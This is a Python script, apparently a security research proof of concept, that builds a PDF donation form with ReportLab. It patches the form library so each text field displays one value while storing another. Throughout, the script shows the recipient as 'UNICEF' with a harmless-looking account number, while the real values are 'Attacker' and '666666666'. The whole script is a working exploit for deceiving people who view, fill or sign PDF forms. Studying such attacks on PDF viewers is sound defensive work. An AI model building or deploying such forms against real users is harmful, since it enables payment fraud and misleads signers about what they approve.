# %%
pdf_form = "pdf/attack/form/form.pdf"
# %%
from reportlab.pdfgen import canvas
from reportlab.pdfbase import pdfform
from reportlab.lib.colors import black, white, magenta
from reportlab.pdfbase.acroform import AcroForm

class MyAcroForm(AcroForm):

    def _textfield(self,
                value='',
                fillColor=None,
                borderColor=None,
                textColor=None,
                borderWidth=1,
                borderStyle='solid',
                width=120,
                height=36,
                x=0,
                y=0,
                tooltip=None,
                name=None,
                annotationFlags='print',
                fieldFlags='',
                forceBorder=False,
                relative=False,
                maxlen=100,
                fontName=None,
                fontSize=None,
                wkind=None,
                options=None,
                dashLen=3,
                overlay=""
                ):
        """
        This function is a copy from reportlab.pdfbase.acroform.Acroform.

        There is only one change:
        We added a parameter `overlay`.
        This parameter is then passed to the function `txAP(value=overlay)` as value instead of the original value.
        """
        from reportlab.pdfbase.acroform import AcroForm, annotationFlagValues, makeFlags, fieldFlagValues
        from reportlab.lib.utils import isStr
        from reportlab.pdfbase.pdfdoc import PDFString, PDFName, PDFArray, PDFDictionary

        rFontName, iFontName = self.makeFont(fontName)
        if fontSize is None:
            fontSize = 12
        textColor,borderColor,fillColor=self.stdColors(textColor,borderColor,fillColor)
        canv = self.canv
        if relative:
            x, y = self.canv.absolutePosition(x,y)
        doc = canv._doc
        rFontName = '<</%s %s>>' % (iFontName,rFontName)
        Ff = makeFlags(fieldFlags,fieldFlagValues)
        if wkind!='textfield':
            #options must be a list of pairs (label value)
            #value must be a list of the values
            FT='Ch'
            if wkind=='choice':
                Ff |= fieldFlagValues['combo']  #just in case
            V = []
            Opt = []
            AP = []
            I = []
            TF = []
            if not isinstance(options,(list,tuple)):
                raise TypeError('%s options=%r is wrong type' % (wkind,options))
            for v in options:
                if isStr(v):
                    Opt.append(PDFString(v))
                    l = v
                elif isinstance(v,(list,tuple)):
                    if len(v)==1:
                        v=l=v[0]
                    else:
                        l,v = v
                    Opt.append(PDFArray([PDFString(v),PDFString(l)]))
                else:
                    raise TypeError('%s option %r is wrong type' % (wkind,v))
                AP.append(v)
                TF.append(l)
            Opt = PDFArray(Opt)
            if value:
                if not isinstance(value,(list,tuple)):
                    value = [value]
                for v in value:
                    if v not in AP:
                        if v not in TF:
                            raise ValueError('%s value %r is not in option\nvalues %r\nor labels %r' % (wkind,v,AP,TF))
                        else:
                            v = AP[TF.index(v)]
                    I.append(AP.index(v))
                    V.append(PDFString(v))
                I.sort()
                if not (Ff & fieldFlagValues['multiSelect']) or len(value)==1:
                    if wkind=='choice':
                        value = TF[I[0]]
                    else:
                        value = value[:1]
                    V = V[:1]
                V = V[0] if len(V)==1 else PDFArray(V)
                lbextras = dict(labels=TF,I=I,wkind=wkind)
            else:
                V = PDFString(value)
        else:
            I = Opt = []
            lbextras = {}
            FT='Tx'
            if not isStr(value):
                raise TypeError('textfield value=%r is wrong type' % value)
            V = PDFString(value)
        AP = {}
        for key in 'N':
            tC,bC,fC = self.varyColors(key,textColor,borderColor,fillColor)
            ap = self.txAP(
                            key,
                            overlay, # Attacker's change: value,
                            iFontName,
                            rFontName,
                            fontSize,
                            fillColor=fC,
                            borderColor=bC,
                            textColor=tC,
                            borderWidth=borderWidth,
                            borderStyle=borderStyle,
                            width=width,
                            height=height,
                            dashLen = dashLen,
                            **lbextras
                            )
            if ap._af_refstr in self._refMap:
                ref = self._refMap[ap._af_refstr]
            else:
                ref = self.getRef(ap)
                self._refMap[ap._af_refstr] = ref
            AP[key] = ref

        TF = dict(
                FT = PDFName(FT),
                P = doc.thisPageRef(),
                V = V,
                #AS = PDFName(value),
                DV = V,
                Rect = PDFArray((x,y,x+width,y+height)),
                AP = PDFDictionary(AP),
                Subtype = PDFName('Widget'),
                Type = PDFName('Annot'),
                F = makeFlags(annotationFlags,annotationFlagValues),
                Ff = Ff,
                #H=PDFName('N'),
                DA=PDFString('/%s %d Tf %s' % (iFontName,fontSize, self.streamFillColor(textColor))),
                )
        if Opt: TF['Opt'] = Opt
        if I: TF['I'] = PDFArray(I)
        if maxlen:
            TF['MaxLen'] = maxlen
        if tooltip:
            TF['TU'] = PDFString(tooltip)
        if not name:
            name = 'AFF%03d' % len(self.fields)
        TF['T'] = PDFString(name)
        MK = dict(
                BG=PDFArray(self.colorTuple(fillColor)),
                )
        # Acrobat seems to draw a thin border when BS is defined, so only
        # include this if there actually is a border to draw
        if borderWidth:
            TF['BS'] = bsPDF(borderWidth,borderStyle,dashLen)
            MK['BC'] = PDFArray(self.colorTuple(borderColor))
        TF['MK'] = PDFDictionary(MK)

        TF = PDFDictionary(TF)
        self.canv._addAnnotation(TF)
        self.fields.append(self.getRef(TF))
        self.checkForceBorder(x,y,width,height,forceBorder,'square',borderStyle,borderWidth,borderColor,fillColor)

    def textfield(self,name,y,value,tooltip,overlay):
        self._textfield(
                name=name,
                value=value,
                tooltip=tooltip,
                overlay=overlay,
                y=y,
                x=220, width=300, height=20,
                textColor=black,
                borderColor=white, borderWidth=0,
                forceBorder=False,
                wkind='textfield'
        )

c = canvas.Canvas(
    filename=pdf_form,
    pageCompression=False
)

form = MyAcroForm(c)
# Example based on:
# https://www.blog.pythonlibrary.org/2018/05/29/creating-interactive-pdf-forms-in-reportlab-with-python/

c.drawCentredString(300,700, "Donation Sender")
c.drawString(50, 650, 'Sender Name:')
form.textfield(name='sendername', y=645, value="Your Name", tooltip='Sender Name', overlay="Your Name",)
c.drawString(50, 600, 'Sender Bank Account:')
form.textfield(name='senderaccount', y=595, value="Your Account", tooltip='Sender Bank Account', overlay="Your Account",)
c.drawString(50, 550, 'Amount:')
form.textfield(name='amount', y=545, value="10 USD", tooltip='Amount', overlay="10 USD",)
c.drawCentredString(300,500, "Donation Recipient")
c.drawString(50, 450, 'Recipient Name:')
form.textfield(name='recipientname', y=445, value="Attacker", tooltip='Recipient Name', overlay="UNICEF",)
c.drawString(50, 400, 'Sender Bank Account:')
form.textfield(name='recipientaccount', y=395, value="666666666", tooltip='Sender Bank Account', overlay="123456789")


c.save()

# %%
